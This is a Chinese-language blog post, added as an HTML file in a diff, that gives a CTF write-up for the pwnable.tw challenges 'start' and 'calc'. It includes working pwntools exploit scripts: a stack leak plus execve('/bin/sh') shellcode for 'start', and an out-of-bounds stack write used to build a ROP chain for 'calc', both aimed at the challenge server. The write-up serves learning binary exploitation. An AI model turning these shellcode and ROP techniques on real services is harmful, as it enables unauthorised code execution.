@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Pwnable.tw (start &amp; calc) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        最近边看书边刷pwnable.tw，记录一下write up。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.tw (start &amp; calc)">
+<meta property="og:url" content="http://example.com/2020/07/25/pwnable/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        最近边看书边刷pwnable.tw，记录一下write up。">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png">
+<meta property="article:published_time" content="2020-07-25T00:19:47.000Z">
+<meta property="article:modified_time" content="2020-07-24T14:23:43.986Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-pwnable" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/25/pwnable/" class="article-date">
+  <time class="post-time" datetime="2020-07-25T00:19:47.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">25</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pwnable.tw (start &amp; calc)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        最近边看书边刷pwnable.tw，记录一下write up。<span id="more"></span></p>
+<h2 id="0x00-start"><a href="#0x00-start" class="headerlink" title="0x00 . start"></a>0x00 . start</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        之前看这个题的时候一脸懵逼，事隔经年感觉貌似能做。。。</p>
+<p>​        程序里只有一个浓眉大眼的start函数：</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212908.png"></p>
+<p>​        其实差不多是这两行代码，一个输出一个输入。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">esp = <span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>;</span><br><span class="line">write(<span class="number">1</span>,esp,<span class="number">0x14</span>);</span><br><span class="line">read(<span class="number">0</span>,esp,<span class="number">0x3C</span>);</span><br></pre></td></tr></table></figure>
+
+<p>​        而且没NX保护：</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724213537.png"></p>
+<p>​        那果断shellcode呗。虽然不知道栈底的位置，但可以找到start函数结束时执行了”add esp,14h”的汇编语句，可以猜测栈的大小为0x14，因为栈顶就是我们输入字符串的地方，所以padding的大小也是这么多。</p>
+<p>​        不过第一次输入时，要先返回到0x08048087这个地址，此时栈帧已经收回，再一次执行write(1,esp,0x14)，就能leak出栈底地址了。</p>
+<p>​        第二次输入，再将返回地址改成栈底+0x14，也就是shellcode的开头地址，即可执行shellcode。</p>
+<p>​        然后开始写shellcode：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push ecx;		 <span class="comment">#字符串结尾	</span></span><br><span class="line">push 0x68732f6e; <span class="comment">#&#x27;n/sh&#x27;</span></span><br><span class="line">push 0x69622f2f; <span class="comment">#&#x27;//bi&#x27;</span></span><br><span class="line">mov ebx,esp;</span><br><span class="line">mov eax,0xb;</span><br><span class="line">int 0x80;</span><br></pre></td></tr></table></figure>
+
+<p>​        然后python转机器数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p>​        然后跑payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Here is addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm:</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">mov eax,0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x14</span> + p32(stack_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x01-calc"><a href="#0x01-calc" class="headerlink" title="0x01 . calc"></a>0x01 . calc</h2><h3 id="A-Analysis-1"><a href="#A-Analysis-1" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        例行公事如下：</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724195515.png"></p>
+<p>​        主要的函数是calc()，分别又实现了get_expr(),init_pool(),parse()三个函数。</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202614.png"></p>
+<p>​        get_expr()接受用户输入计算表达式，并过滤掉除了“+-*、%0123456789”之外的字符，init_pool()申请堆块来存放数组并且初始化，程序中的若干个运算数就被存放在这个数组中，parse()进行表达式的解析并且运算。</p>
+<p>​        主要来看看parse函数的执行机制：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="keyword">int</span> str, _DWORD *num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> <span class="keyword">operator</span>[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v5 = str;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  bzero(<span class="keyword">operator</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (*(i + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + str - v5;</span><br><span class="line">      s1 = <span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v5, v2);</span><br><span class="line">      s1[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (*num)++;</span><br><span class="line">        num[v4 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(i + str) &amp;&amp; (*(i + <span class="number">1</span> + str) - <span class="string">&#x27;0&#x27;</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = i + <span class="number">1</span> + str;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">operator</span>[j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(i + str) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">operator</span>[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; <span class="keyword">operator</span>[j] != <span class="string">&#x27;-&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">              <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">operator</span>[++j] = *(i + str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j]);</span><br><span class="line">            <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">operator</span>[j] = *(i + str);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//Check Point</span></span><br><span class="line">      <span class="keyword">if</span> ( !*(i + str) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( j &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(num, <span class="keyword">operator</span>[j--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        大意是遍历每个字符，把每个运算数保存在num数组(此处num的传参是int型，因此后面数组赋值均用指针寻址)，而且从下标[1]开始保存，num[0]则用来实时保存操作数的个数。每一个运算符被存于operator数组中。</p>
+<p>​        在瞅瞅实际用来进行运算的eval()函数：</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724202337.png"></p>
+<p>​        运算方式为:用num[0]当作下标找对应的运算数，再将其与前面的运算数(即num[num[0]-1])进行计算，结果返回到后者。</p>
+<p>​        举例：输入1+3时，num[0] = 2，num[1] = 1，num[2] = 3</p>
+<p>​        运算之后：num[0] = 1，num[1] = 4。</p>
+<p>​        而且parse函数中的检查点会检查num[0]是否为0。</p>
+<p>​        而这题的<strong>漏洞点</strong>在eval函数里。函数中规定最后一个运算数与前者进行运算，但是没有考虑过第一个运算数不存在的情况。</p>
+<p>​        举例：输入+300时，num[0] = 1，num[1] = 300，执行如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[1-1] += num[1]</span></span><br><span class="line"><span class="comment">//	num[0] += num[1]</span></span><br></pre></td></tr></table></figure>
+
+<p>​        也就是说，我们输入的300，那么301会被存放在num[0]中，但是num[0]运算结束后-1，因此仍然是300。而在函数calc中我们知道，num[i-1]会被。printf输出，而calc中的i相当于parse和eval中的num[0]。最后输出的是calc函数中的num[299]，相当于输出了parse中的num[300]。所以说，”+x”句式可以达成栈上的任意读。</p>
+<p>​        再举例：输入+300+1024时，num[0] = 2，num[1] = 300，num[2] = 1024，但是上面我们说过，第一步运算结束后，num[0]为302，自减后为301，因此之后会执行如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 	num[*num - <span class="number">1</span>] += num[*num];</span><br><span class="line"><span class="comment">//	num[num[0]-1] += num[num[0]]</span></span><br><span class="line"><span class="comment">//	num[301-1] += num[2]</span></span><br><span class="line"><span class="comment">//	num[300] += num[2]</span></span><br></pre></td></tr></table></figure>
+
+<p>​        所以我们在num[2]中写的东西，都会被加到num[300]里面。这里的num[1]和num[2]都可控，也就实现了栈上任意地址写。</p>
+<h3 id="B-Attack"><a href="#B-Attack" class="headerlink" title="B . Attack"></a>B . Attack</h3><p>​        虽然程序在栈上开启了canary，但是上述的任意地址写是定向的，不会破坏canary。程序还开启了栈上不可执行保护，因此我们需要通过syscall调用execve。</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724210855.png"></p>
+<p>​        0x5A0÷4 = 360，所以num[0]到calc函数的栈底为360个单位。栈上结构大致如下：</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211047.png" style="zoom:67%;" />
+
+<p>​        stack of main上面都属于calc的栈帧。而我们要改写的rop链和栈结构如下：</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724211153.png" style="zoom: 67%;" />
+
+<p>​        其他的改写都比较简单，重点在于“/bin/sh”字符串，要让函数成功调用，就不能让他属于calc函数和execve函数的栈帧中，以免被清空。所以写在了int 80地址的后面。</p>
+<p>​        那么如何求出这个地址呢？由上图我们可以看出calc栈帧中的old ebp我们也可以读出来，因为调用calc的上层函数是main，所以这个old ebp就是main函数的ebp。于是我们知道了栈底。不过这个ebp指向的确切位置我们不知道，因此只能再找找其他偏移。在main函数的汇编代码中，我们还可以求出esp的值。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724222247.png" style="zoom:80%;" />
+
+<p>​        那么我们可以进而求出main函数的栈帧大小为ebp-esp+4，因为ebp和esp所在的单位都算main函数的栈帧，因此需要加4。</p>
+<p>​        知道main_size之后，再用ebp - main_size，就求出了main函数的栈顶，或者说calc栈底向下的一个单位，也就是num[361]的位置。而我们知道bin语句的地址在num[368]，因此ebp - main_size + 4*8就是我们要输入”/bin/sh”的地址。</p>
+<h3 id="C-Exploit"><a href="#C-Exploit" class="headerlink" title="C . Exploit"></a>C . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./calc&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">int80_addr = <span class="number">0x08049a21</span></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span></span><br><span class="line">pop_edx = <span class="number">0x0804848f</span></span><br><span class="line">pop_ecx_pop_ebx = <span class="number">0x080701d1</span></span><br><span class="line">stack = [pop_eax,<span class="number">0xB</span>,pop_edx,<span class="number">0</span>,pop_ecx_pop_ebx,<span class="number">0</span>,<span class="number">0</span>,int80_addr,u32(<span class="string">&quot;/bin&quot;</span>),u32(<span class="string">&quot;/sh\x00&quot;</span>)]</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;+360&quot;</span>)</span><br><span class="line">i=p.recv()</span><br><span class="line">ebp = <span class="built_in">int</span>(i)+<span class="number">0x100000000</span></span><br><span class="line">esp = (ebp&amp;<span class="number">0xFFFFFFF0</span>)-<span class="number">0x10</span></span><br><span class="line">main_size = ebp - esp + <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span> main_size</span><br><span class="line">rop_size = <span class="number">4</span>*<span class="number">8</span></span><br><span class="line">stack[<span class="number">6</span>] = <span class="built_in">int</span>(i)-main_size+rop_size</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	index = <span class="number">361</span> + i</span><br><span class="line">	p.sendline(<span class="string">&quot;+&quot;</span>+ <span class="built_in">str</span>(index))</span><br><span class="line">	data = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="keyword">if</span>( stack[i]&gt;data):</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&quot;+&quot;</span>+<span class="built_in">str</span>(index)+<span class="built_in">str</span>(stack[i]-data))</span><br><span class="line">	result = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;num[&quot;</span>+<span class="built_in">str</span>(index)+<span class="string">&quot;] : &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(result))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;halo....&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​        最后还得sendline一下才能getshell。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/img/20200724212541.png" style="zoom: 80%;" />
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/25/pwnable/" data-id="ckmlis0zb000fs0ljd2vaaz9p" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/19/Intermediate%20ROP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Intermediate ROP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/13/2020%205space/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">5space (of-twice复现)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
